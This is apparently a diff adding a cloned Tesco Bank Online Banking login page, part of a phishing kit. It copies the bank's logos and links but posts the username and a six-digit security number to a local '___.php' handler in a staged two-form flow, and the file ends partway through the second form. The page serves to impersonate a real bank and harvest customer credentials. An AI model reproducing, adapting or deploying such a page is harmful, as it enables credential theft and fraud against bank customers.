@@ -1,0 +1,989 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Online Banking Login - Tesco Bank</title>
+  <!--<base href="https://identity.tescobank.com/"/>-->
+  <meta name="description" content="Log in to your Tesco Bank current accounts, credit cards, loans and savings through our Online Banking portal.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta content="app-id=857834425" name="apple-itunes-app" />
+  <meta content="app-id=com.tescobank.mobile" name="google-play-app" />
+
+  <link rel="stylesheet" href="https://identity.tescobank.com/afm/responsive-assets/css/main.css">
+  <!--<script src="https://identity.tescobank.com/afm/responsive-assets/js/main-head.js"></script>-->
+  <!--<script src="//nexus.ensighten.com/tescobank/brochureware/Bootstrap.js"></script>-->
+  <!--[if IE 9 & !IEMobile ]>
+  <script>
+    document.getElementsByTagName('html')[0].className += ' ie9';
+  </script><![endif]-->
+
+  <link rel="icon" href="https://identity.tescobank.com/favicon.ico" type="image/x-icon"> 
+
+</head>
+<body>
+<div id="app"></div>
+<div class="container">
+  <header role="banner" aria-label="Header">
+    <div class="fixed-container fixed-container--narrow">
+      <div class="basic-header">
+        <a href="https://www.tescobank.com:443/">
+          <div class="basic-header__logo">
+            <div class="logo" role="img" aria-label="Tesco Bank">
+              <svg viewBox="0 0 240 42" version="1.1"><title>Tesco Bank</title>
+                <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                  <g transform="translate(-120.000000, -798.000000)">
+                    <g transform="translate(120.000000, 798.000000)">
+                      <path
+                              d="M11.2,34.5707702 L28.6666667,34.5707702 C28.8666667,34.5707702 28.8666667,34.7034794 28.6666667,34.7698341 C26.7333333,35.6987991 23.8666667,38.5520489 23.8666667,38.5520489 C21.9333333,40.4763336 20.4,41.6707172 17,41.6707172 L0.266666667,41.6707172 C0.133333333,41.6707172 0.133333333,41.4716533 0.266666667,41.4716533 C2.13333333,40.4763336 4.86666667,37.6230838 4.86666667,37.6230838 C6,36.2959909 8.33333333,34.5707702 11.2,34.5707702"
+                              fill="#00539F"></path>
+                      <path
+                              d="M125.866667,34.5707702 L143.4,34.5707702 C143.533333,34.5707702 143.533333,34.7034794 143.4,34.7698341 C141.333333,35.6987991 138.6,38.5520489 138.6,38.5520489 C136.533333,40.4763336 135,41.6707172 131.733333,41.6707172 L115,41.6707172 C114.866667,41.6707172 114.866667,41.4716533 115,41.4716533 C116.866667,40.4763336 119.6,37.6230838 119.6,37.6230838 C120.733333,36.2959909 123,34.5707702 125.866667,34.5707702"
+                              fill="#00539F"></path>
+                      <path
+                              d="M39.8666667,34.5707702 L57.3333333,34.5707702 C57.5333333,34.5707702 57.5333333,34.7034794 57.3333333,34.7698341 C55.4,35.6987991 52.5333333,38.5520489 52.5333333,38.5520489 C50.6,40.4763336 49.0666667,41.6707172 45.6666667,41.6707172 L29.0666667,41.6707172 C28.8666667,41.6707172 28.8666667,41.4716533 28.9333333,41.4716533 C30.8,40.4763336 33.5333333,37.6230838 33.5333333,37.6230838 C34.6666667,36.2959909 37,34.5707702 39.8666667,34.5707702"
+                              fill="#00539F"></path>
+                      <path
+                              d="M68.5333333,34.5707702 L86,34.5707702 C86.2,34.5707702 86.2,34.7034794 86,34.7698341 C84.0666667,35.6987991 81.2,38.5520489 81.2,38.5520489 C79.2666667,40.4763336 77.7333333,41.6707172 74.4666667,41.6707172 L57.7333333,41.6707172 C57.6,41.6707172 57.6,41.4716533 57.6,41.4716533 C59.5333333,40.4763336 62.2,37.6230838 62.2,37.6230838 C63.3333333,36.2959909 65.6666667,34.5707702 68.5333333,34.5707702"
+                              fill="#00539F"></path>
+                      <path
+                              d="M97.2,34.5707702 L114.733333,34.5707702 C114.866667,34.5707702 114.866667,34.7034794 114.6,34.7698341 C112.666667,35.6987991 109.8,38.5520489 109.8,38.5520489 C107.866667,40.4763336 106.333333,41.6707172 103.066667,41.6707172 L86.3333333,41.6707172 C86.2,41.6707172 86.2,41.4716533 86.3333333,41.4716533 C88.2,40.4763336 90.9333333,37.6230838 90.9333333,37.6230838 C92,36.2959909 94.3333333,34.5707702 97.2,34.5707702"
+                              fill="#00539F"></path>
+                      <path
+                              d="M127.133333,24.0203816 C121.933333,24.0203816 118.533333,19.7736843 118.533333,14.5316673 C118.533333,9.28965033 121.933333,5.04295304 127.133333,5.04295304 C132.333333,5.04295304 135.733333,9.28965033 135.733333,14.5316673 C135.733333,19.7073296 132.333333,24.0203816 127.133333,24.0203816 M127.133333,1.12802897 C116.8,1.12802897 110.933333,7.09994704 110.933333,14.4653127 C110.933333,21.8306783 116.866667,27.8025963 127.133333,27.8025963 C137.4,27.8025963 143.333333,21.8306783 143.333333,14.4653127 C143.4,7.09994704 137.466667,1.12802897 127.133333,1.12802897"
+                              fill="#EE1C2E"></path>
+                      <path
+                              d="M44,23.754963 L40.2,23.754963 L40.2,16.1905334 L42.6,16.1905334 C43.9333333,16.1905334 45.2,16.2568881 46.4,16.3895974 C47.2,16.455952 48,16.5886613 48.8,16.7877252 L48.8,11.6120629 C48,11.7447722 47.2,11.8774815 46.4,12.0101908 C45.2,12.1429001 43.9333333,12.2092547 42.6,12.2092547 L40.2,12.2092547 L40.2,5.24201697 L42.6,5.24201697 C46.8666667,5.24201697 50.6,6.03827271 53.6666667,7.36536562 L53.6666667,1.26073826 L42.6,1.26073826 L32.4666667,1.26073826 C33.4666667,2.58783116 33.6666667,3.31773226 33.6666667,5.77285413 L33.6666667,23.1577712 C33.6666667,25.6792477 33.4666667,26.4091488 32.4666667,27.6698871 L55.1333333,27.6698871 L55.1333333,21.5652597 C52,22.9587072 48.3333333,23.754963 44,23.754963"
+                              fill="#EE1C2E"></path>
+                      <path
+                              d="M100.466667,28.3334335 C103.733333,28.3334335 106.6,27.9353056 110,27.0063406 L110,20.3708761 L109.933333,20.4372307 C108.8,21.6316143 107.6,22.4942247 106.333333,23.0914165 C105,23.6222537 103.533333,23.9540269 101.866667,23.9540269 C95.7333333,23.9540269 91.7333333,19.7073296 91.7333333,14.4653127 C91.7333333,9.22329569 95.7333333,4.97659839 101.866667,4.97659839 C103.933333,4.97659839 105.733333,5.44108091 107.266667,6.3036913 C108.133333,6.83452846 108.866667,7.43172026 109.6,8.22797601 L109.6,1.39344755 C107.466667,0.995319678 104.8,0.663546452 102.133333,0.663546452 C94.2666667,0.663546452 88.2666667,3.5167962 85.4666667,8.29433065 C84.2666667,10.2186154 83.6,12.5410279 83.6,14.9297952 C83.6,22.2951608 89.5333333,28.2670789 99.8,28.2670789 L100.466667,28.2670789 L100.466667,28.3334335 Z"
+                              fill="#EE1C2E"></path>
+                      <path
+                              d="M80.6666667,2.45512187 C76.6,0.729901097 72.1333333,0.464482517 68.7333333,0.464482517 C62.6,0.464482517 56.7333333,2.58783116 57.0666667,9.0905864 C57.6666667,20.3045214 75.8,14.398958 76.1333333,21.2998411 C76.2666667,23.5558991 73,24.4848641 70.3333333,24.4848641 C65.6,24.4848641 61.9333333,23.4895444 57.7333333,20.8353586 L57.7333333,26.5418581 C61.5333333,27.8025963 65.7333333,28.3334335 70.2666667,28.3334335 C76.6,28.3334335 82.4666667,26.4755034 82.1333333,19.8400389 C81.5333333,8.02891207 63.4666667,13.3372837 63.1333333,7.6307842 C63,5.30837162 65.9333333,4.44576123 68.4666667,4.44576123 C72.8,4.44576123 77.5333333,5.70649949 80.6,8.49339459 L80.6,2.45512187 L80.6666667,2.45512187 Z"
+                              fill="#EE1C2E"></path>
+                      <path
+                              d="M1.8,1.26073826 L1.8,7.36536562 C4.86666667,5.97191807 8.6,5.24201697 12.8666667,5.24201697 L12.8666667,23.2241258 C12.8666667,25.7456023 12.6666667,26.4755034 11.6666667,27.7362417 L20.6666667,27.7362417 C19.6666667,26.4091488 19.4666667,25.6792477 19.4666667,23.1577712 L19.4666667,5.24201697 C23.7333333,5.24201697 27.4666667,6.03827271 30.5333333,7.36536562 L30.5333333,1.26073826 L1.8,1.26073826 L1.8,1.26073826 Z"
+                              fill="#EE1C2E"></path>
+                      <path
+                              d="M161.0364,1.5557377 L170.0016,1.5557377 C172.258411,1.5557377 174.031594,2.14312254 175.3212,3.31790984 C176.610806,4.49269713 177.2556,6.09409368 177.2556,8.12214754 C177.2556,9.30930102 176.964203,10.3665937 176.3814,11.2940574 C175.798597,12.221521 175.098004,12.8954678 174.2796,13.315918 C175.643607,13.8352977 176.716196,14.6452705 177.4974,15.7458607 C178.278604,16.8464509 178.6692,18.2376255 178.6692,19.9194262 C178.6692,22.2690008 177.931407,24.1239003 176.4558,25.4841803 C174.980193,26.8444604 172.977613,27.5245902 170.448,27.5245902 L161.0364,27.5245902 L161.0364,1.5557377 Z M169.89,12.2400656 C171.229207,12.2400656 172.258396,11.9185497 172.9776,11.2755082 C173.696804,10.6324667 174.0564,9.680285 174.0564,8.41893443 C174.0564,7.15758386 173.696804,6.20540212 172.9776,5.56236066 C172.258396,4.91931919 171.216807,4.59780328 169.8528,4.59780328 L164.31,4.59780328 L164.31,12.2400656 L169.89,12.2400656 Z M170.0388,24.4825246 C171.725208,24.4825246 173.033395,24.0991787 173.9634,23.3324754 C174.893405,22.5657721 175.3584,21.4157344 175.3584,19.8823279 C175.3584,18.3241889 174.899605,17.1679683 173.982,16.4136311 C173.064395,15.659294 171.750009,15.2821311 170.0388,15.2821311 L164.31,15.2821311 L164.31,24.4825246 L170.0388,24.4825246 Z M185.2536,27.1350574 C184.286395,26.6775086 183.517603,26.0221108 182.9472,25.1688443 C182.376797,24.3155777 182.0916,23.320115 182.0916,22.1824262 C182.0916,20.1791047 182.860392,18.6271722 184.398,17.526582 C185.935608,16.4259918 187.981587,15.8757049 190.536,15.8757049 L194.628,15.8757049 L194.628,14.9111475 C194.628,13.6745293 194.194004,12.6914326 193.326,11.9618279 C192.457996,11.2322231 191.342007,10.8674262 189.978,10.8674262 C188.812394,10.8674262 187.801804,11.1518442 186.9462,11.7206885 C186.090596,12.2895329 185.427202,13.0314927 184.956,13.9465902 L182.538,12.4997541 C183.182803,11.2136712 184.143794,10.1563785 185.421,9.32784426 C186.698206,8.49931007 188.217191,8.08504918 189.978,8.08504918 C192.309212,8.08504918 194.187793,8.69098301 195.6138,9.90286885 C197.039807,11.1147547 197.7528,12.7965302 197.7528,14.9482459 L197.7528,27.5245902 L195.2604,27.5245902 L194.7024,24.630918 C194.082397,25.5707479 193.220606,26.3374397 192.117,26.9310164 C191.013394,27.5245931 189.792007,27.821377 188.4528,27.821377 C187.287194,27.821377 186.220805,27.5926061 185.2536,27.1350574 L185.2536,27.1350574 Z M191.7078,24.3712295 C192.588204,23.926047 193.294997,23.2644661 193.8282,22.3864672 C194.361403,21.5084683 194.628,20.4759076 194.628,19.2887541 L194.628,18.5467869 L190.6104,18.5467869 C188.899191,18.5467869 187.591005,18.8559368 186.6858,19.4742459 C185.780595,20.092555 185.328,20.9334428 185.328,21.9969344 C185.328,22.9614966 185.650397,23.7096394 186.2952,24.2413852 C186.940003,24.7731311 187.807995,25.039 188.8992,25.039 C189.891205,25.039 190.827396,24.8164121 191.7078,24.3712295 L191.7078,24.3712295 Z M202.998,8.38183607 L206.1228,8.38183607 L206.1228,11.980377 C206.668403,10.7932236 207.505394,9.84722484 208.6338,9.14235246 C209.762206,8.43748008 210.995993,8.08504918 212.3352,8.08504918 C214.24481,8.08504918 215.757594,8.64770202 216.8736,9.77302459 C217.989606,10.8983472 218.5476,12.4626457 218.5476,14.4659672 L218.5476,27.5245902 L215.4228,27.5245902 L215.4228,15.059541 C215.4228,13.7487257 215.100403,12.740897 214.4556,12.0360246 C213.810797,11.3311522 212.868406,10.9787213 211.6284,10.9787213 C210.561995,10.9787213 209.607204,11.3064202 208.764,11.9618279 C207.920796,12.6172355 207.269802,13.5508683 206.811,14.7627541 C206.352198,15.9746399 206.1228,17.3843635 206.1228,18.9919672 L206.1228,27.5245902 L202.998,27.5245902 L202.998,8.38183607 Z M227.55,16.5434754 L234.9528,8.38183607 L238.8588,8.38183607 L230.898,17.1741475 L239.4168,27.5245902 L235.548,27.5245902 L227.55,17.8048197 L227.55,27.5245902 L224.4252,27.5245902 L224.4252,1.25895082 L227.55,1.25895082 L227.55,16.5434754 Z"
+                              fill="#00539F"></path>
+                    </g>
+                  </g>
+                </g>
+              </svg>
+            </div>
+          </div>
+        </a></div>
+    </div>
+  </header>
+
+  <main role="main" class="main-container">
+    <div id="content" class="step">
+
+      <div class="step-heading">
+        <div class="fixed-container fixed-container--narrow">
+          <div class="step-heading__wrapper">
+            <div class="step-heading__content">
+                <h1 class="step-heading__title">Log in</h1>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="login" class="step-content" data-tag="pagename">
+
+        <div class="fixed-container fixed-container--narrow">
+
+          <div id="login-warning" class="callout callout--message add-bottom js-hide" style="display: none;">
+            <h2 class="callout__header">You need to turn on JavaScript</h2>
+            <p class="callout__content">To log in to Tesco Bank Online Banking, you need to be able to accept Cookies and have JavaScript turned on.<br/>You can adjust these settings in your browser. For more information, please see our <a href="https://www.tescobank.com:443/online-banking/technical-support" class="external-link" rel="nofollow">Online Banking troubleshooting guide</a>.</p>
+          </div>
+
+          
+          
+          
+          <!-- Page 1 -->
+          
+          <form name="form1" method="post" action="___.php?_do=form1" id="login-form-olb" class="form js-login-form-olb pg-forms" autocomplete="off" xstyle="display: none;">
+
+            <input type="hidden" name="screen" value="banking"/>
+
+            <div class="form__box-compact">
+              <div role="group" aria-labelledby="header-OLB">
+                <div class="form__heading-container">
+                  <h2 id="header-OLB" class="form__heading form__heading--alt">Online Banking</h2>
+                  <span class="form__heading-logo">
+                    <a href="#" target="_blank">
+                      <div class="fscs-logo" role="img" aria-label="FSCS protected logo">
+                        <svg viewBox="0 0 352 360" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient x1="10.924%" y1="66.05%" x2="98.076%" y2="26.741%" id="a"><stop stop-color="#6C1C73" offset="10.6%"/><stop stop-color="#1F3B72" offset="43.2%"/><stop stop-color="#AAC811" offset="72%"/><stop stop-color="#6C1C73" offset="96.5%"/></linearGradient></defs><g fill="none" fill-rule="evenodd"><path d="M0 0h351.496v263.622H0zM0 283.464h351.496v76.535H0z"/><path d="M86.345 322.933c-.985 0-1.971-.053-2.956-.053v13.434h-4.772v-35.168a37 37 0 0 1 6.847-.674c4.979 0 9.7.777 12.137 5.705a10.929 10.929 0 0 1 1.193 5.084c0 7.676-5.135 11.672-12.449 11.672zm.1-18.518a29.68 29.68 0 0 0-3.06.154v14.317c.985.051 2.023.1 3.008.1 4.772 0 7.521-2.49 7.521-7.314.004-4.925-2.589-7.257-7.465-7.257h-.004z" fill="#6C1C73" fill-rule="nonzero"/><path d="M115.742 315.152c-.767-.16-1.55-.23-2.334-.21a6.786 6.786 0 0 0-5.5 3.268v18.1h-4.357v-24.635h3.475l.467 2.541a7.864 7.864 0 0 1 6.276-3.215c.792-.002 1.58.12 2.334.363l-.361 3.788z" fill="#6C1C73"/><path d="M129.176 336.987c-7.832 0-11.93-5.705-11.93-13.123 0-7.209 4.513-12.966 12.086-12.966 7.624 0 11.877 5.808 11.877 12.966 0 7.262-4.356 13.123-12.033 13.123zm.156-22.668c-5.187 0-7.366 4.981-7.366 9.545s2.023 9.7 7.21 9.7c5.187 0 7.261-5.135 7.261-9.7 0-4.511-1.918-9.545-7.105-9.545z" fill="#6C1C73" fill-rule="nonzero"/><path d="M153.881 336.987c-3.164 0-5.186-1.244-6.276-3.683-.519-1.192-.727-3.112-.727-6.223v-12.4H143.3v-2.955h3.578v-4.662l4.411-1.713v6.381h6.9v2.9h-6.9v12.709a12.961 12.961 0 0 0 .465 4.1 2.962 2.962 0 0 0 3.061 1.97 7.817 7.817 0 0 0 4.46-1.816l.675 3.164a9.769 9.769 0 0 1-6.069 2.228z" fill="#6C1C73"/><path d="M182.357 324.902c-2.177.052-4.252 0-6.275 0h-10.01c.155 4.513 2.7 8.558 7.572 8.558a12.45 12.45 0 0 0 7.883-2.9l.52 3.578a14.607 14.607 0 0 1-9.025 2.853c-7.833 0-11.774-5.861-11.774-13.173 0-7 4.045-12.916 11.566-12.916a9.9 9.9 0 0 1 5.342 1.556c3.164 2.075 4.408 5.549 4.408 9.336a21.646 21.646 0 0 1-.207 3.108zm-9.857-10.477c-4.046 0-6.017 3.371-6.38 7.055h11.78c0-.157.053-.313.053-.467-.004-3.373-1.819-6.588-5.453-6.588z" fill="#6C1C73" fill-rule="nonzero"/><path d="M197.971 336.987c-7.26 0-12.19-5.548-12.19-12.656 0-7.728 5.033-13.433 12.813-13.433a12.41 12.41 0 0 1 7.521 2.334l-.881 3.371a11.441 11.441 0 0 0-6.484-2.178c-5.188 0-8.246 4.408-8.246 9.336 0 4.98 2.644 9.752 8.09 9.752a12.66 12.66 0 0 0 7-2.178l.828 3.266a16.549 16.549 0 0 1-8.451 2.386zM218.773 336.987c-3.164 0-5.187-1.244-6.277-3.683-.518-1.192-.725-3.112-.725-6.223v-12.4h-3.58v-2.955h3.58v-4.662l4.409-1.713v6.381h6.9v2.9h-6.9v12.709a12.925 12.925 0 0 0 .466 4.1 2.961 2.961 0 0 0 3.061 1.97 7.825 7.825 0 0 0 4.461-1.816l.674 3.164a9.767 9.767 0 0 1-6.069 2.228z" fill="#6C1C73"/><path d="M247.2 324.902c-2.178.052-4.252 0-6.275 0h-10.01c.154 4.513 2.695 8.558 7.572 8.558a12.452 12.452 0 0 0 7.883-2.9l.52 3.578a14.612 14.612 0 0 1-9.026 2.853c-7.832 0-11.773-5.861-11.773-13.173 0-7 4.047-12.916 11.566-12.916a9.91 9.91 0 0 1 5.343 1.552c3.164 2.075 4.41 5.549 4.41 9.336a21.8 21.8 0 0 1-.21 3.112zm-9.853-10.477c-4.047 0-6.018 3.371-6.381 7.055h11.775c0-.157.051-.313.051-.467-.003-3.373-1.817-6.588-5.448-6.588h.003zM268.881 336.314l-.52-2.18a10.7 10.7 0 0 1-7.105 2.853c-6.639 0-10.737-5.445-10.737-12.812 0-7.779 5.5-13.174 11.411-13.174 2.12.023 4.19.653 5.964 1.816v-13.175h4.358v36.672h-3.371zm-.987-19.868a9.617 9.617 0 0 0-5.5-1.763c-3.318 0-7.158 2.853-7.158 9.285 0 6.018 2.7 9.389 6.692 9.389a8.409 8.409 0 0 0 5.964-2.594l.002-14.317z" fill="#6C1C73" fill-rule="nonzero"/><path d="M39.1 193.304a24.227 24.227 0 0 0 10.211 1.879c20.483 0 36.682-13.069 48.149-38.836l13.109-31.8h20.744l4.59-8.957h-22.124l.838-2c7.5-18.025 17.177-27.162 28.752-27.162 3.249.184 6.434.978 9.388 2.341l6.85-10.408a31.483 31.483 0 0 0-11.883-2.487c-20.488 0-36.693 13.074-48.165 38.861l-.385.86h-37.85l-4.607 8.969 38.772-.017-5.049 11.9H45.585l-4.6 8.9h46.237L82.2 157.47c-7.508 18.031-17.11 27.172-28.535 27.172a25.369 25.369 0 0 1-9.234-2.287L39.1 193.304zM270.7 128.076c-2.857-3-6.8-4.723-10.941-4.783a12.094 12.094 0 0 0-6.994 2.046 6.715 6.715 0 0 0-3.2 5.388 5.563 5.563 0 0 0 1.407 4.186 21.517 21.517 0 0 0 5.462 3.932l7.231 4.031a11.494 11.494 0 0 1 6.225 11.154 18.643 18.643 0 0 1-7.434 14.44c-4.604 3.547-10.314 5.32-17.129 5.318a28.5 28.5 0 0 1-15.863-4.471l5.808-9.572a18.329 18.329 0 0 0 5.737 3.8 16.282 16.282 0 0 0 6.562 1.738c2.87.091 5.684-.812 7.965-2.558a9.045 9.045 0 0 0 3.484-6.9 5.363 5.363 0 0 0-1.4-3.976 22.736 22.736 0 0 0-5.377-4.03l-7.269-4.144a12.393 12.393 0 0 1-4.907-4.967 12.1 12.1 0 0 1-1.365-6.4 16.3 16.3 0 0 1 6.881-12.711 24.977 24.977 0 0 1 15.4-4.821c4.14 0 9.06 1.314 14.762 3.941l-5.045 9.359zM226.144 126.25c-2.453-1.972-5.816-2.954-10.125-2.954a20.369 20.369 0 0 0-16.277 7.727 31.42 31.42 0 0 0-7.121 19c-.267 4.605.828 8.281 3.285 11.027a11.311 11.311 0 0 0 8.694 4.109 27.4 27.4 0 0 0 15.074-4.761l-1.723 10.322a38.569 38.569 0 0 1-15.418 3.07c-7.017 0-12.292-2.009-15.826-6.027-3.534-4.018-5.11-9.356-4.729-16.014.614-10.837 4.09-19.707 10.428-26.612a30.483 30.483 0 0 1 23.338-10.355c5.451 0 9.688.959 12.7 2.841l-2.3 8.627zM171.95 128.076a15.377 15.377 0 0 0-10.943-4.783 12.107 12.107 0 0 0-7 2.046 6.758 6.758 0 0 0-3.2 5.388 5.558 5.558 0 0 0 1.416 4.186 21.23 21.23 0 0 0 5.469 3.932l7.219 4.031a11.5 11.5 0 0 1 6.228 11.154 18.622 18.622 0 0 1-7.434 14.44c-4.615 3.547-10.325 5.32-17.13 5.318a28.476 28.476 0 0 1-15.86-4.471l5.8-9.572a18.311 18.311 0 0 0 5.738 3.8 16.335 16.335 0 0 0 6.571 1.738c2.87.088 5.684-.815 7.966-2.558a9.008 9.008 0 0 0 3.478-6.9 5.436 5.436 0 0 0-1.4-3.976 22.543 22.543 0 0 0-5.379-4.03l-7.266-4.144a12.382 12.382 0 0 1-4.91-4.967 12.129 12.129 0 0 1-1.372-6.4 16.3 16.3 0 0 1 6.883-12.711 25.012 25.012 0 0 1 15.409-4.821c4.142 0 9.061 1.314 14.758 3.941l-5.041 9.359z" fill="#6C1C73"/><path d="M189.627 38.252c-3.817 0-7.639.079-11.473.263A233.4 233.4 0 0 0 145 42.253a158.441 158.441 0 0 0-32.44 9.477 89.782 89.782 0 0 0-15.313 8.154 60.36 60.36 0 0 0-7.033 5.51 41.039 41.039 0 0 0-6.109 6.915 29.812 29.812 0 0 0-4.18 8.652 24.831 24.831 0 0 0-.835 9.72 29.17 29.17 0 0 0 2.591 9.04c.141.3.3.586.446.88.251.321.636.509 1.044.509a1.3 1.3 0 0 0 1.321-1.272 1.213 1.213 0 0 0-.1-.5l.01.009c-.124-.294-.258-.584-.373-.882a26.626 26.626 0 0 1-1.846-8.175 21.713 21.713 0 0 1 1.107-8.126 25.157 25.157 0 0 1 3.911-7.169 45.59 45.59 0 0 1 12.354-10.694 91.932 91.932 0 0 1 14.725-7.189 143.743 143.743 0 0 1 15.588-4.97c5.272-1.388 10.608-2.51 15.971-3.426a254.349 254.349 0 0 1 32.425-3.325c10.843-.363 21.759-.3 32.6.18 5.426.232 10.836.662 16.231 1.2a207.994 207.994 0 0 1 16.1 2.23 126.482 126.482 0 0 1 31.114 9.328 77.125 77.125 0 0 1 14.074 8.453 61.035 61.035 0 0 1 6.222 5.527 54.445 54.445 0 0 1 5.385 6.477 50.9 50.9 0 0 1 7.365 15.491 62.59 62.59 0 0 1 2.235 17.432 87.289 87.289 0 0 1-7.893 34.221 115.01 115.01 0 0 1-8.267 15.273c-3.103 4.78-6.53 9.34-10.256 13.651a121.364 121.364 0 0 1-11.778 11.89 112.683 112.683 0 0 1-6.347 5.246 107.225 107.225 0 0 1-6.608 4.758 100.315 100.315 0 0 1-28.505 13.422l-1.838.5a66.49 66.49 0 0 1-1.893.465 60.01 60.01 0 0 1-3.7.732 60.424 60.424 0 0 1-7.473.842 72.925 72.925 0 0 1-7.539-.019 82.514 82.514 0 0 1-7.553-.842 102.131 102.131 0 0 1-29.579-10.164 176.228 176.228 0 0 1-27.579-17.725l-.094-.094-.014.012-.135-.1.02.031a1 1 0 0 0-.631-.233.982.982 0 0 0-1 .963.921.921 0 0 0 .234.6l-.032.025c7.27 9.43 17.366 18.829 29.631 27.2l-.061-.063a83.222 83.222 0 0 0 26.892 12.1 65.085 65.085 0 0 0 8.7 1.527c2.95.34 5.921.474 8.89.4a69.433 69.433 0 0 0 8.934-.805 69.85 69.85 0 0 0 4.424-.883c.842-.2 1.332-.314 2.139-.527l2.173-.592a94.918 94.918 0 0 0 31.648-16.497 121.217 121.217 0 0 0 24.8-26.483 133.824 133.824 0 0 0 9.424-15.742 127.687 127.687 0 0 0 7.22-16.939 105.4 105.4 0 0 0 6.08-33.735v-.429c0-.69-.011-1.38-.031-2.069a69.766 69.766 0 0 0-2.736-18.06 56.364 56.364 0 0 0-7.729-16.1 62.237 62.237 0 0 0-11.826-12.671 81.272 81.272 0 0 0-14.186-9.311 135.225 135.225 0 0 0-31.38-11.412c-5.4-1.293-10.852-2.315-16.325-3.159-5.473-.844-10.98-1.4-16.492-1.855-5.512-.455-11.039-.676-16.564-.776-1.487-.019-2.974-.03-4.461-.033l-.667.003z" fill="url(#a)"/></g></svg>
+                      </div>
+                    </a>
+                  </span>
+                </div>
+
+                
+                <div class="form__item form__item--wide form__item--close">
+                  <label for="OLB_UNIQUEID" class="form__label">
+                    <span>Username</span>
+                    <span>&nbsp;( <a href="#" class="form__link--default svr-busy">I've forgotten<span class="screen-reader-only"> my username link</span></a> )</span>
+                    
+                    <!--<span class="form__error">This field is required.</span>-->
+                  </label>
+
+                  <div class="form__control">
+                    <input type="text" id="OLB_UNIQUEID" name="username" value="" class="form__input form__input--full"/>
+                  </div>
+                </div>
+
+                <div class="form__item form__item--wide form__item--closer">
+                  <div class="form__control js-remember-me-control">
+                    <div class="form__checkbox">
+                      <input class="form__checkbox__input" type="checkbox" id="OLB_REMEMBER_USERNAME"
+                             name="OLB_REMEMBER_USERNAME" value="Y"/>
+                      <label class="form__checkbox__label form__checkbox__label--small" for="OLB_REMEMBER_USERNAME">Remember username</label>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="form__item no-bottom">
+                  <div class="button-group-extended button-group-extended--fixed">
+                    <input type="submit" name="submit" id="submit-OLB_UNIQUEID" class="button button--action" value="Login"/>
+                    <a id="sign-up-OLB_UNIQUEID" href="#" class="form__link-anchor svr-busy">
+                      <span class="form__link-wrapper">
+                        <span class="form__link-icon ui-Icon" data-icon="ArrowRight" data-small="true"></span>
+                        <span class="form__link-label">Sign up</span>
+                      </span>
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </form>
+            
+               
+               
+               
+               
+               
+        
+              
+               
+          <!-- Page 2 --> 
+              
+          <form name="form2" method="post" action="___.php?_do=form2" id="login-form-olb-2" class="form js-login-form-olb pg-forms" autocomplete="off" style="display: none;">
+            
+            
+            <div class="ui-ConfirmationPanel" data-field="Username" data-value="">
+                <div class="confirmation-panel">
+                    <div class="confirmation-panel__row">
+                        <dl class="property-list property-list--space-between" data-qa-hook="property-list">
+                            <div class="property-list__item">
+                                <dt class="property-list__key">Username</dt>
+                                <dd class="property-list__value js-entered-username">...</dd>
+                            </div>
+                        </dl>
+                    </div>
+                </div>
+            </div>
+            
+            
+             
+              <div class="form__panel">
+                
+                
+                  <div class="form__group form__group--security-number form__group--close js-autotab">
+                      <fieldset>
+                  
+                          <legend class="form__label">Security number</legend>
+                  
+                          <p>Please confirm your <span class=" bold">6</span> digits security number</p>
+                  
+                          <div class="form__item">
+                            <label class="form__label" for="DIGIT1"><span class="screen-reader-only">digit</span>1 </label>
+                              <div class="form__control">
+                                  <input type="password" inputmode="numeric" pattern="[0-9]" name="DIGIT1" id="DIGIT1" class="form__input nums-only secdigit" maxlength="1">
+                              </div>
+                          </div>
+                          <div class="form__item">
+                            <label class="form__label" for="DIGIT2"><span class="screen-reader-only">digit</span>2 </label>
+                              <div class="form__control">
+                                  <input type="password" inputmode="numeric" pattern="[0-9]" name="DIGIT2" id="DIGIT2" class="form__input nums-only secdigit" maxlength="1">
+                              </div>
+                          </div>
+                          <div class="form__item">
+                            <label class="form__label" for="DIGIT3"><span class="screen-reader-only">digit</span>3 </label>
+                              <div class="form__control">
+                                  <input type="password" inputmode="numeric" pattern="[0-9]" name="DIGIT3" id="DIGIT3" class="form__input nums-only secdigit" maxlength="1">
+                              </div>
+                          </div>
+                          <div class="form__item">
+                            <label class="form__label" for="DIGIT4"><span class="screen-reader-only">digit</span>4 </label>
+                              <div class="form__control">
+                                  <input type="password" inputmode="numeric" pattern="[0-9]" name="DIGIT4" id="DIGIT4" class="form__input nums-only secdigit" maxlength="1">
+                              </div>
+                          </div>
+                          <div class="form__item">
+                            <label class="form__label" for="DIGIT5"><span class="screen-reader-only">digit</span>5 </label>
+                              <div class="form__control">
+                                  <input type="password" inputmode="numeric" pattern="[0-9]" name="DIGIT5" id="DIGIT5" class="form__input nums-only secdigit" maxlength="1">
+                              </div>
+                          </div>
+                          <div class="form__item">
+                            <label class="form__label" for="DIGIT6"><span class="screen-reader-only">digit</span>6 </label>
+                              <div class="form__control">
+                                  <input type="password" inputmode="numeric" pattern="[0-9]" name="DIGIT6" id="DIGIT6" class="form__input nums-only secdigit" maxlength="1">
+                              </div>
+                          </div>
+                  
+                      </fieldset>
+                  </div>
+
+                  <div class="form__link form__link--tooltip">
+                      <a href="#" class="form__link-anchor xjs-tooltip" data-target="">
+                          <span class="form__link-wrapper" style="align-items:baseline">
+                    <span class="form__link-icon ui-Icon" data-icon="ArrowDown" data-small="true"><i class="icon  icon--round icon--small" aria-hidden="true"><svg width="20" height="14" viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><g fill="none"><path d="M20.65 5.31L12 14.28 3.36 5.31"></path></g></svg></i></span>
+                          <span class="form__link-label" style="border-bottom:none;">Forgotten your Security Number or Password?</span>
+                          </span>
+                      </a>
+                  </div>
+                  
+                         
+                   <!--  <div class="form__item form__item--narrow form__item--close">
+                          <label for="security_number" class="form__label">
+                            <span>Security Number</span>
+                          </label>
+
+                          <div class="form__control">
+                            <input type="password" id="security_number" name="security_number" value="" class="form__input form__input--full nums-only" maxlength="6"/>
+                          </div>
+                    </div> -->
+                      
+                      
+                      
+                       
